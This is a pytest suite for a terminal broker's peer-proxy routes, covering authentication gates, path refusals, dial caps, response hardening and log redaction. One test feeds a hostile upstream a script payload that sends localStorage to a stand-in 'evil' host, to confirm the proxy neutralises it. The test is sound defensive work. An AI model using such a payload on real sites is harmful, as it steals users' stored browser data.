"""#252 phase 1, atom 3: the /peer/<id>/ route family on a live broker.

Broker A is a real ``create_app`` served on a free port in its own thread
(``LiveApp``), so requests can be concurrent (the dial cap) and the client can
read a body while it streams. Broker B is the recording fake upstream. Every
refusal is asserted together with the upstream hit count it must leave at 0.
"""

from __future__ import annotations

import json
import socket
import sys
import threading

import httpx
import pytest

from .auth_helpers import TEST_TOKEN
from .peer_upstream import Answer, FakeUpstream, LiveApp
from webterm.broker import peers
from webterm.broker.app import ADMIN_HEADER, create_app
from webterm.protocol import MCP_ADMIN_HEADER, SCOPE_HEADER

B_TOKEN = "b-browser-token"
B_MCP = "b-mcp-token"
_seq = 0


def _dead_origin() -> str:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
    return f"http://127.0.0.1:{port}"


def _make_app(tmp_path, peer_map, **cfg):
    global _seq
    _seq += 1
    base = {"state_path": str(tmp_path / "webterm_state.json"),
            "auth_token": TEST_TOKEN, "serve_ui": False, "peers": peer_map}
    base.update(cfg)
    return create_app(base, port=4999, name=f"webterm-peer-proxy-{_seq}")


@pytest.fixture(scope="module")
def upstream():
    up = FakeUpstream().start()
    yield up
    up.stop()


@pytest.fixture(scope="module")
def live(upstream, tmp_path_factory):
    tmp = tmp_path_factory.mktemp("peer-a")
    (tmp / "a-only-marker.txt").write_text("A's disk", encoding="utf-8")
    peer_map = {pid: {"origin": upstream.origin}
                for pid in ("b", "c", "d", "e", "f")}
    peer_map["m"] = {"origin": upstream.origin, "mcp": True}
    peer_map["dead"] = {"origin": _dead_origin()}
    app = _make_app(tmp, peer_map)
    srv = LiveApp(app).start()
    srv.tmp = tmp
    yield srv
    srv.stop()


@pytest.fixture(autouse=True)
def _fresh(upstream):
    upstream.seen.clear()
    upstream.routes.clear()
    upstream.gate_timed_out = False


def browser(origin, *, a=TEST_TOKEN, b=B_TOKEN, extra=None):
    h = {}
    if a is not None:
        h["Authorization"] = "Bearer " + a
    if b is not None:
        h[peers.PEER_TOKEN_HEADER] = b
    if origin is not None:
        h[peers.PEER_ORIGIN_HEADER] = origin
    h.update(extra or {})
    return h


def _client():
    return httpx.AsyncClient(timeout=30, trust_env=False,
                             limits=httpx.Limits(max_connections=100))


async def _get(live, path, headers=None, method="GET", **kw):
    async with _client() as c:
        return await c.request(method, live.url + path, headers=headers, **kw)


def _hardened(r):
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["Content-Security-Policy"] == peers.SANDBOX_CSP


# ---- the browser gate ---------------------------------------------------------

async def test_both_credentials_relay_to_b(live, upstream):
    r = await _get(live, "/peer/b/info?x=1&token=" + TEST_TOKEN,
                   browser(upstream.origin))
    assert r.status_code == 200, r.text
    assert r.json()["broker_id"] == "fake-b"
    assert r.headers["Content-Type"] == "application/json"
    _hardened(r)
    seen = upstream.seen[-1]
    assert seen.target == "/info?x=1"                # A's ?token= stripped
    assert seen.one("Authorization") == "Bearer " + B_TOKEN
    assert TEST_TOKEN not in json.dumps(seen.headers)


@pytest.mark.parametrize("label,hdrs", [
    ("A only", dict(b=None)),
    ("peer token only", dict(a=None)),
    ("wrong A", dict(a="nope")),
    ("neither", dict(a=None, b=None)),
])
async def test_each_credential_alone_is_401(live, upstream, label, hdrs):
    r = await _get(live, "/peer/b/info", browser(upstream.origin, **hdrs))
    assert r.status_code == 401
    assert r.json() == {"ok": False, "error": "auth_required"}
    _hardened(r)
    assert upstream.seen == []


async def test_a_query_token_does_not_open_the_prefix(live, upstream):
    r = await _get(live, "/peer/b/info?token=" + TEST_TOKEN,
                   browser(upstream.origin, a=None))
    assert r.status_code == 401
    assert upstream.seen == []


@pytest.mark.parametrize("origin", [None, "http://127.0.0.1:1", ""])
async def test_a_missing_or_stale_pairing_is_409_without_a_dial(
        live, upstream, origin):
    r = await _get(live, "/peer/b/info", browser(origin))
    assert r.status_code == 409
    assert r.json() == {"ok": False, "error": "peer_origin_changed"}
    assert upstream.seen == []


async def test_unknown_peer_is_a_json_404(live, upstream):
    r = await _get(live, "/peer/zz/info", browser(upstream.origin))
    assert r.status_code == 404
    assert r.json() == {"ok": False, "error": "unknown_peer"}
    _hardened(r)
    assert upstream.seen == []


@pytest.mark.parametrize("path,error", [
    ("/peer/b/", "not_relayed"), ("/peer/b", "not_relayed"),
    ("/peer/b/state", "not_relayed"), ("/peer/b/ws", "not_relayed"),
    ("/peer/b/control", "not_relayed"), ("/peer/b/browserland", "not_relayed"),
    ("/peer/b/status/fetch", "not_relayed"),
    ("/peer/b/peer/c/info", "peer_hop_refused"),
    ("/peer/b/mod-store/a%2Fpeer%2Fb", "peer_hop_refused"),
])
async def test_unlisted_paths_never_dial(live, upstream, path, error):
    r = await _get(live, path, browser(upstream.origin))
    assert r.status_code == 404
    assert r.json() == {"ok": False, "error": error}
    _hardened(r)
    assert upstream.seen == []


async def test_options_is_not_relayed(live, upstream):
    r = await _get(live, "/peer/b/info", method="OPTIONS")
    assert r.status_code == 405
    assert upstream.seen == []


async def test_put_state_is_not_relayed(live, upstream):
    r = await _get(live, "/peer/b/state", browser(upstream.origin),
                   method="PUT", content=b"{}")
    assert r.status_code == 404
    assert upstream.seen == []


async def test_encoded_path_is_dialed_canonical(live, upstream):
    r = await _get(live, "/peer/b/inf%6F", browser(upstream.origin))
    assert r.status_code == 200
    assert upstream.seen[-1].path == "/info"


async def test_file_list_on_the_prefix_is_bs_files(live, upstream):
    body = json.dumps({"path": str(live.tmp)}).encode()
    r = await _get(live, "/peer/b/file/list",
                   browser(upstream.origin,
                           extra={"Content-Type": "application/json"}),
                   method="POST", content=body)
    assert r.status_code == 200, r.text
    assert "a-only-marker" not in r.text
    assert r.json() == {"ok": True, "broker_id": "fake-b",
                        "path": "/file/list", "method": "POST"}
    assert upstream.seen[-1].body == body


async def test_admin_and_scope_headers_cross_on_the_browser_gate(live,
                                                                 upstream):
    r = await _get(live, "/peer/b/mods/policy",
                   browser(upstream.origin, extra={
                       ADMIN_HEADER: "b-admin", SCOPE_HEADER: "s1",
                       MCP_ADMIN_HEADER: "b-mcp-admin",
                       "Content-Type": "application/json"}),
                   method="POST", content=b'{"set": {}}')
    assert r.status_code == 200
    seen = upstream.seen[-1]
    assert seen.one(ADMIN_HEADER) == "b-admin"
    assert seen.one(SCOPE_HEADER) == "s1"
    assert seen.one(MCP_ADMIN_HEADER) is None


# ---- the MCP gate ----------------------------------------------------------------

async def test_mcp_prefix_is_404_unless_the_peer_opts_in(live, upstream):
    r = await _get(live, "/peer/b/mcp/terminals",
                   {"Authorization": "Bearer " + B_MCP})
    assert r.status_code == 404
    assert r.json() == {"error": "unknown_peer"}
    assert upstream.seen == []


async def test_mcp_gate_takes_bs_mcp_token_alone(live, upstream):
    r = await _get(live, "/peer/m/mcp/terminals", {
        "Authorization": "Bearer " + B_MCP, MCP_ADMIN_HEADER: "b-mcp-admin",
        SCOPE_HEADER: "s1"})
    assert r.status_code == 200, r.text
    seen = upstream.seen[-1]
    assert seen.path == "/mcp/terminals"
    assert seen.one("Authorization") == "Bearer " + B_MCP
    assert seen.one(MCP_ADMIN_HEADER) == "b-mcp-admin"
    assert seen.one(SCOPE_HEADER) == "s1"
    assert seen.one(ADMIN_HEADER) is None


async def test_mcp_gate_without_a_bearer_is_401(live, upstream):
    r = await _get(live, "/peer/m/mcp/terminals")
    assert r.status_code == 401
    assert r.json() == {"error": "auth_required"}
    assert upstream.seen == []


async def test_a_repeated_scope_is_400_without_a_dial(live, upstream):
    r = await _get(live, "/peer/m/mcp/terminals", [
        ("Authorization", "Bearer " + B_MCP), (SCOPE_HEADER, "s1"),
        (SCOPE_HEADER, "s2")])
    assert r.status_code == 400
    assert r.json() == {"error": "bad_scope"}
    assert upstream.seen == []


# ---- response hardening on the wire -------------------------------------------------

async def test_html_from_b_reaches_the_client_as_octet_stream(live, upstream):
    upstream.routes["/info"] = lambda s: Answer(
        200, [("Content-Type", "text/html"), ("Set-Cookie", "sid=evil"),
              ("Access-Control-Allow-Credentials", "true")],
        b"<script>fetch('//evil/'+JSON.stringify(localStorage))</script>")
    r = await _get(live, "/peer/b/info", browser(upstream.origin))
    assert r.status_code == 200
    assert r.headers["Content-Type"] == "application/octet-stream"
    _hardened(r)
    assert "set-cookie" not in r.headers
    assert "access-control-allow-credentials" not in r.headers
    # A's own CORS answer is the only ACAO on the wire.
    assert r.headers.get_list("Access-Control-Allow-Origin") == ["*"]


async def test_a_redirect_is_relayed_without_location(live, upstream):
    upstream.routes["/info"] = lambda s: Answer(
        302, [("Location", upstream.origin + "/redirect-target")])
    r = await _get(live, "/peer/b/info", browser(upstream.origin))
    assert r.status_code == 302
    assert "location" not in r.headers
    assert upstream.hits("/redirect-target") == 0


async def test_twenty_mib_streams_through_the_route(live, upstream):
    size = 20 * 2**20
    blob = bytes(range(256)) * (size // 256)
    first = threading.Event()
    upstream.routes["/recording"] = lambda s: Answer(
        200, [("Content-Type", "application/octet-stream")], blob,
        gate=first, gate_timeout=10)
    got = bytearray()
    async with _client() as c:
        async with c.stream("GET", live.url + "/peer/b/recording?id=r1",
                            headers=browser(upstream.origin)) as r:
            assert r.status_code == 200
            async for chunk in r.aiter_raw():
                got += chunk
                first.set()
    assert upstream.gate_timed_out is False
    assert bytes(got) == blob


async def test_a_down_peer_is_502(live):
    r = await _get(live, "/peer/dead/info", browser(
        live.app.ctx.peers["dead"]["origin"]))
    assert r.status_code == 502
    assert r.json() == {"ok": False, "error": "peer_unreachable"}
    _hardened(r)


# ---- the dial cap ---------------------------------------------------------------------

async def _hold_on(live, upstream, pids, per):
    """Start `per` held dials to each peer id; returns (tasks, release)."""
    import asyncio
    release = threading.Event()
    upstream.routes["/sessions"] = lambda s: Answer(
        200, [("Content-Type", "application/json")], b"[]", hold=release)
    client = _client()
    tasks = [asyncio.ensure_future(client.get(
        live.url + f"/peer/{pid}/sessions", headers=browser(upstream.origin)))
        for pid in pids for _ in range(per)]
    for _ in range(200):
        if upstream.hits("/sessions") >= len(tasks):
            break
        await asyncio.sleep(0.05)
    return client, tasks, release


async def test_one_peer_cannot_take_every_slot(live, upstream):
    client, tasks, release = await _hold_on(live, upstream, ["b"],
                                            peers.PEER_MAX_DIALS_PER_PEER)
    try:
        assert upstream.hits("/sessions") == 8
        r = await client.get(live.url + "/peer/b/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 503
        assert r.json() == {"ok": False, "error": "peer_busy"}
        assert upstream.hits("/info") == 0
        r = await client.get(live.url + "/peer/c/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 200
    finally:
        release.set()
        for t in tasks:
            assert (await t).status_code == 200
        await client.aclose()


async def test_the_global_cap_holds_across_peers(live, upstream):
    client, tasks, release = await _hold_on(live, upstream,
                                            ["b", "c", "d", "e"], 8)
    try:
        assert upstream.hits("/sessions") == peers.PEER_MAX_DIALS == 32
        r = await client.get(live.url + "/peer/f/info",
                             headers=browser(upstream.origin))
        assert r.status_code == 503
        assert r.json()["error"] == "peer_busy"
    finally:
        release.set()
        for t in tasks:
            await t
        await client.aclose()
    # Every slot came back.
    assert live.app.ctx.peer_cap._busy == {}


# ---- without the proxy extra ------------------------------------------------------------

async def test_missing_extra_is_503(tmp_path, upstream, monkeypatch):
    with monkeypatch.context() as m:
        # Simulated absence, for create_app's probe only (httpx is in the
        # test interpreter via mcp and sanic-testing).
        m.setitem(sys.modules, "httpx", None)
        app = _make_app(tmp_path, {"b": {"origin": upstream.origin},
                                   "m": {"origin": upstream.origin,
                                         "mcp": True}})
    assert app.ctx.peer_proxy is False
    srv = LiveApp(app).start()
    try:
        r = await _get(srv, "/peer/b/info", browser(upstream.origin))
        assert r.status_code == 503
        assert r.json() == {"ok": False, "error": "proxy_unavailable"}
        r = await _get(srv, "/peer/m/mcp/info",
                       {"Authorization": "Bearer " + B_MCP})
        assert r.status_code == 503
        assert r.json() == {"error": "proxy_unavailable"}
    finally:
        srv.stop()
    assert upstream.seen == []


# ---- R4: nothing logs the upstream URL ------------------------------------------------

async def test_no_log_record_names_the_upstream(live, upstream, caplog):
    import logging
    with caplog.at_level(logging.DEBUG):
        r = await _get(live, "/peer/b/recording?id=secret-q",
                       browser(upstream.origin))
        assert r.status_code == 200
        dead = live.app.ctx.peers["dead"]["origin"]
        r = await _get(live, "/peer/dead/info?id=secret-q", browser(dead))
        assert r.status_code == 502
    text = "\n".join(rec.getMessage() for rec in caplog.records)
    assert "peer dead: GET /info failed" in text
    for secret in (str(upstream.port), dead.rsplit(":", 1)[1], "secret-q",
                   B_TOKEN, TEST_TOKEN, "http://"):
        assert secret not in text, secret
